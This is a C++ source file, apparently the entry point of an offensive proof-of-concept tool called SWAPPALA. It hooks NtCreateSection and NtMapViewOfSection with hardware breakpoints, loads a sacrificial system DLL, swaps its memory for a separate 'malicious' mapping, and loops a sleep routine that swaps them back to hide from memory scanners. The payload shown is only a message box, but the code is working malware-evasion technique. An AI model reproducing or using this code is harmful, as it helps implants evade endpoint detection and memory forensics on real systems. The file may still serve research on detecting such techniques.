// SWAPPALA.cpp : This file contains the 'main' function. Program execution begins and ends there.
//

#include <Windows.h>
#include <stdio.h>
#include "syscalls.h"
#include "misc.h"
#include "swappala.h"
#include "HBP.h"
#include "headers.h"
#include "globals.h"
#include "handlesenum.h"

int main()
{
    //variables
    CHAR SRHPATH[] = { 'C', ':', '\\', '\\', 'W', 'i', 'n', 'd', 'o', 'w', 's', '\\', '\\', 'S', 'y', 's', 't', 'e', 'm', '3', '2', '\\','S','R','H','.','d','l','l','\0' };
    PVOID ZwCloseAddress = NULL;
    PVOID NtMapViewOfSectionAddress = NULL;
    PVOID NtCreateSectionAddress = NULL;
    HMODULE NTDLL = NULL;
    HMODULE SRHMODULE = NULL;
    HANDLE SRHHANDLE = NULL;
    PBYTE SRHBASE = NULL;
    SIZE_T SRHSIZE = NULL;
    HANDLE MALHANDLE = NULL;
    BYTE SWAPPALA[] = { 0x53, 0x57, 0x41, 0x50, 0x50, 0x41, 0x4C, 0x41, 0x00 };


    //retrieve the needed syscalls
    RetrieveZwFunctions(GetModuleHandleA("ntdll.dll"), zwFunctions);

    //set hardware breakpoints
    
    AddVectoredExceptionHandler(1, (PVECTORED_EXCEPTION_HANDLER)&VectorHandler);
    NTDLL = GetModuleHandleA("ntdll.dll");
    if (NTDLL != NULL) {
        ZwCloseAddress = GetProcAddress(NTDLL, "ZwClose");
        NtMapViewOfSectionAddress = GetProcAddress(NTDLL, "NtMapViewOfSection");
        NtCreateSectionAddress = GetProcAddress(NTDLL, "NtCreateSection");


        if (ZwCloseAddress != NULL && NtMapViewOfSectionAddress != NULL && NtCreateSectionAddress != NULL) {
            setHardwareBreakpoint(ZwCloseAddress, NtMapViewOfSectionAddress, NtCreateSectionAddress);

        }
        else {
            printf("[-] Failed retrieving the addresses of functions to be hooked\n");
        }
    }
    
    //load sacrifical dll
    SRHMODULE = LoadLibraryExA(SRHPATH,NULL, DONT_RESOLVE_DLL_REFERENCES);

    //remove hardware breakpoint
    unsetHardwareBreakpoint(1);
    unsetHardwareBreakpoint(2);
    unsetHardwareBreakpoint(3);

    RemoveVectoredExceptionHandler((PVECTORED_EXCEPTION_HANDLER)&VectorHandler);

    
    if (SRHMODULE != NULL) {
        //retrieve sacrificial DLL handle
        SRHHANDLE = FindSectionHandle(zwFunctions);
        if (SRHHANDLE != NULL) {
        
            printf("[+] Successfully retrieve the Section handle: %p\n", SRHHANDLE);
            
        }
    }
    else {
    
        printf("[-] Error while loading the sacrificial DLL\n");
        return;
    }

    
    //create space and unmap sacrificial dll
    SRHSIZE = RetrieveModuleSize((PBYTE) SRHMODULE);
    MALHANDLE = SwapDll(SRHSIZE,(PVOID) SRHMODULE);
    if (MALHANDLE == NULL) {

        printf("[-] Error while swapping DLLs \n");
        
    }
    memcpy(SRHMODULE, SWAPPALA, sizeof(SWAPPALA));
    

    //hide and seek 
    do {

		if (Sleaping(SRHMODULE, SRHHANDLE, MALHANDLE, SRHSIZE) == -1) {
			printf("[-] Error while swapping DLLs\n");
			return -1;
		}
        MessageBoxA(NULL, "Check Memory Drago!", "SWAPPALA", MB_OK | MB_ICONINFORMATION);
        
    } while (TRUE);
}
